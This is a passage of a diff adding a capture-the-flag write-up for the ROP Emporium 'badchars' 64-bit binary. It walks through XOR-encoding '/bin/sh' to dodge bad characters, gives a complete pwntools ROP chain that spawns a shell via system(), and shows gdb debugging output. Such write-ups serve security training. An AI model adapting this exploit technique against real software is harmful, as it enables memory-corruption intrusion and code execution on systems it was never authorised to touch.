+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;pop&nbsp;r14<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;badchars<br>
+                0x0000000000400b40:&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>7b) Find a suitable xor encrypted version of /bin/sh</strong></h3><br>
+        <code>bin/sh\x00</code> in hex is <code>2f62696e2f736800</code>.<br>
+        <br>
+        I used this site to convert the string to hex - <a href="https://www.rapidtables.com/convert/number/ascii-to-hex.html">https://www.rapidtables.com/convert/number/ascii-to-hex.html</a><br>
+        And I'm using this site to calculate encrypted /bin/sh values - <a href="http://xor.pw/">http://xor.pw/</a><br>
+        <br>
+        • <code>/bin/sh\x00</code> xor encrypted with a key of 01 is <code>2e63686f2e726901</code><br>
+        ◇ This won't work because the result contains a bad character of <code>63</code><br>
+        • <code>/bin/sh\x00</code> xor encrypted with a key of <code>02</code> is <code>2d606b6c2d716a02</code><br>
+        ◇ This is perfect because the resulting string doesn't contain any bad characters<br>
+        <br>
+        <a id="h2-12" name="h2-12"></a><strong></strong>
+        <h2><strong>8) Write Final Exploit</strong></h2><br>
+        We have everything we need to write a string to memory, decrypt it, and run system().<br>
+        <br>
+        <strong>Plan</strong><br>
+        • ROP start - overflow buffer and prep registers to write /bin/sh to memory<br>
+        • Part 1 - write /bin/sh to memory<br>
+        • Part 2 - xor decrypt the /bin/sh string in memory<br>
+        • Part 3 - prep parameters for system()<br>
+        • Part 4 - run system() and get a shell!<br>
+        <br>
+        <strong>Explanation</strong><br>
+        Our encrypted string needs to be in big endian format (i.e. in reverse, so that it's read by the system properly)<br>
+            <div class="codebox">
+                enc_binsh_string&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&gt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x2d606b6c2d716a02</span>)
+            </div>
+        </div><br>
+        <br>
+        Our string gets decrypted 1 byte at a time, so we have to loop through the string 8 times, specifying the next byte in the sequence each time, in order to decrypt it.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">8</span>):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;loop&nbsp;8&nbsp;times&nbsp;for&nbsp;8&nbsp;bytes&nbsp;(from&nbsp;0&nbsp;to&nbsp;7)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pop_r14_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prep&nbsp;parameters&nbsp;for&nbsp;xor&nbsp;decryption</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;xor_key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;xor&nbsp;key&nbsp;into&nbsp;r14</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00601080</span>&nbsp;+&nbsp;i)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;address&nbsp;of&nbsp;string&nbsp;(.bss)&nbsp;+&nbsp;byte&nbsp;to&nbsp;decrypt&nbsp;(i)&nbsp;into&nbsp;R15</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;xor_r14_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;xor&nbsp;decryption&nbsp;on&nbsp;byte</span>
+            </div>
+        </div><br>
+        <br>
+        You'll have to bear in mind with <code>p64(0x00601080 + i)</code>, if you hit a bad character then your exploit will fail.<br>
+        For example, if you used the .data address (found eariler) to write your string to - <code>0x0601070</code> - when decrypting the 4th byte you'll create a bad character - <code>0x0601070</code> + <code>3</code> = <code>0x0601073</code> - 73 is a bad character. This will cause your whole exploit to fail as this 4th byte won't get decrypted. This stumped me for a while when doing this challenge.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>Final Script</strong></h3><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;GADGETS&nbsp;---------</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ROP&nbsp;start</span><br>
+                pop_r12_pop_r13_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b3b</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r12;&nbsp;pop&nbsp;r13;&nbsp;ret;</span><br>
+                enc_binsh_string&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&gt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x2d606b6c2d716a02</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;encrypted&nbsp;"/bin/sh\x00"&nbsp;with&nbsp;key&nbsp;of&nbsp;"02"&nbsp;-&nbsp;BIG&nbsp;ENDIAN&nbsp;FORMAT</span><br>
+                bss_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00601080</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;.bss&nbsp;-&nbsp;48&nbsp;bytes&nbsp;of&nbsp;writable&nbsp;memory</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;1&nbsp;gadgets</span><br>
+                mov_r12_into_r13_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b34</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r13],&nbsp;r12;&nbsp;ret;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;move&nbsp;value&nbsp;in&nbsp;r12&nbsp;into&nbsp;memory&nbsp;address&nbsp;pointed&nbsp;to&nbsp;by&nbsp;r13</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;2&nbsp;gadgets</span><br>
+                pop_r14_r15_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b40</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;</span><br>
+                xor_r14_r15_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b30</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;byte&nbsp;ptr&nbsp;[r15],&nbsp;r14b;&nbsp;ret;</span><br>
+                xor_key&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x02</span>)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;3&nbsp;gadgets</span><br>
+                pop_rdi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b39</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;ret</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;gadgets</span><br>
+                system_plt_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x004006f0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-i&nbsp;badchars</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;EXPLOIT&nbsp;---------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;@&nbsp;40&nbsp;bytes</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ROP&nbsp;start&nbsp;-&nbsp;Prep&nbsp;to&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;pop_r12_pop_r13_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;enc_binsh_string&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;encrypted&nbsp;"/bin/sh\x00"&nbsp;into&nbsp;R12</span><br>
+                payload&nbsp;+=&nbsp;bss_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;.bss&nbsp;address&nbsp;into&nbsp;R13</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;1&nbsp;-&nbsp;Write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_r12_into_r13_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;string&nbsp;to&nbsp;.bss&nbsp;address</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;2&nbsp;-&nbsp;xor&nbsp;decrypt&nbsp;string&nbsp;byte&nbsp;by&nbsp;byte</span><br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">8</span>):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;loop&nbsp;8&nbsp;times&nbsp;for&nbsp;8&nbsp;bytes&nbsp;(from&nbsp;0&nbsp;to&nbsp;7)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pop_r14_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prep&nbsp;parameters&nbsp;for&nbsp;xor&nbsp;decryption</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;xor_key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;xor&nbsp;key&nbsp;into&nbsp;r14</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00601080</span>&nbsp;+&nbsp;i)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;address&nbsp;of&nbsp;byte&nbsp;to&nbsp;decrypt&nbsp;(.bss)&nbsp;into&nbsp;R15&nbsp;(i&nbsp;specifies&nbsp;the&nbsp;byte)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;xor_r14_r15_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;xor&nbsp;decryption&nbsp;on&nbsp;byte</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;3&nbsp;-&nbsp;Prep&nbsp;parameters&nbsp;for&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prep&nbsp;to&nbsp;run&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;bss_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;into&nbsp;RDI</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;-&nbsp;Run&nbsp;system()</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;"B"*5</span><br>
+                payload&nbsp;+=&nbsp;system_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-13" name="h2-13"></a><strong></strong>
+        <h2><strong>9) Win!</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;(python&nbsp;badpwn.py;&nbsp;cat)&nbsp;|&nbsp;./badchars<br>
+                badchars&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                badchars&nbsp;are:&nbsp;b&nbsp;i&nbsp;c&nbsp;/&nbsp;&lt;space&gt;&nbsp;f&nbsp;n&nbsp;s<br>
+                &gt;&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                cat&nbsp;flag.txt<br>
+                ROPE{a_placeholder_32byte_flag!}<br>
+                exit<br>
+                exit<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-14" name="h2-14"></a><strong></strong>
+        <h2><strong>Bonus - Testing the Exploit</strong></h2><br>
+        If you return to 5 <code>B</code>s instead of the <code>system_plt_addr</code>,<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;part&nbsp;4&nbsp;-&nbsp;Run&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">5</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;system_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;system("/bin/sh")</span>
+            </div>
+        </div><br>
+        you'll crash the program and be able to read the register contents at the end of your exploit in gdb.<br>
+        <br>
+        Output the modified exploit to a text file so that you can run it with gdb.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;python&nbsp;badpwn.py&nbsp;&gt;&nbsp;pwn.txt
+            </div>
+        </div><br>
+        <br>
+        And look at the registers at the time of the crash.<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;r&nbsp;&lt;&nbsp;pwn.txt<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ropemporium/badchars/badchars&nbsp;&lt;&nbsp;pwn.txt<br>
+                badchars&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                badchars&nbsp;are:&nbsp;b&nbsp;i&nbsp;c&nbsp;/&nbsp;&lt;space&gt;&nbsp;f&nbsp;n&nbsp;s<br>
+                &gt;&nbsp;<br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                <br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x0&nbsp;<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0x602010&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RDX:&nbsp;0x0&nbsp;<br>
+                RSI:&nbsp;0x1&nbsp;<br>
+                RDI:&nbsp;0x601080&nbsp;--&gt;&nbsp;0x68732f6e69622f&nbsp;('/bin/sh')<br>
+                RBP:&nbsp;0x4141414141414141&nbsp;('AAAAAAAA')<br>
+                RSP:&nbsp;0x7fffffffe280&nbsp;--&gt;&nbsp;0x7fffffffe636&nbsp;("DESKTOP_SESSION=gnome")<br>
+                RIP:&nbsp;0xa4242424242&nbsp;('BBBBB\n')<br>
+                R8&nbsp;:&nbsp;0x1ff&nbsp;<br>
+                R9&nbsp;:&nbsp;0x602260&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                R10:&nbsp;0x0&nbsp;<br>
+                R11:&nbsp;0x7ffff7e74be0&nbsp;(&lt;__GI___libc_free&gt;: push&nbsp;&nbsp;&nbsp;rbx)<br>
+                R12:&nbsp;0x26a712d6c6b602d&nbsp;<br>
+                R13:&nbsp;0x601080&nbsp;--&gt;&nbsp;0x68732f6e69622f&nbsp;('/bin/sh')<br>
+                R14:&nbsp;0x2&nbsp;<br>
+                R15:&nbsp;0x601087&nbsp;--&gt;&nbsp;0x0<br>
+                EFLAGS:&nbsp;0x10246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                Invalid&nbsp;$PC&nbsp;address:&nbsp;0xa4242424242<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7fffffffe280&nbsp;--&gt;&nbsp;0x7fffffffe636&nbsp;("DESKTOP_SESSION=gnome")<br>
+                0008|&nbsp;0x7fffffffe288&nbsp;--&gt;&nbsp;0x7fffffffe64c&nbsp;("SSH_AGENT_PID=943")<br>
+                0016|&nbsp;0x7fffffffe290&nbsp;--&gt;&nbsp;0x7fffffffe65e&nbsp;("GTK_MODULES=gail:atk-bridge")<br>
+                0024|&nbsp;0x7fffffffe298&nbsp;--&gt;&nbsp;0x7fffffffe67a&nbsp;("XDG_SEAT=seat0")<br>
+                0032|&nbsp;0x7fffffffe2a0&nbsp;--&gt;&nbsp;0x7fffffffe689&nbsp;("PWD=/root/ctf/ropemporium/badchars")<br>
+                0040|&nbsp;0x7fffffffe2a8&nbsp;--&gt;&nbsp;0x7fffffffe6ac&nbsp;("LOGNAME=root")<br>
+                0048|&nbsp;0x7fffffffe2b0&nbsp;--&gt;&nbsp;0x7fffffffe6b9&nbsp;("XDG_SESSION_DESKTOP=gnome")<br>
+                0056|&nbsp;0x7fffffffe2b8&nbsp;--&gt;&nbsp;0x7fffffffe6d3&nbsp;("XDG_SESSION_TYPE=x11")<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x00000a4242424242&nbsp;in&nbsp;??&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        You'll see that RDI contains <code>/bin/sh</code>, which is exactly what we need for system() to run <code>system("/bin/sh")</code> and spawn a shell.<br>
+        <br>
+        I've found that crashing the binary just before your system() is good way of testing/debugging what might be going wrong with your exploit. If you don't reach the sytstem() call, something has gone wrong earlier. If you do reach the system() call but no shell is spawned, then you can look at RDI register to see if it contains the correct value or not.
+    </writeup>
+</section>
+</body>
+</html>
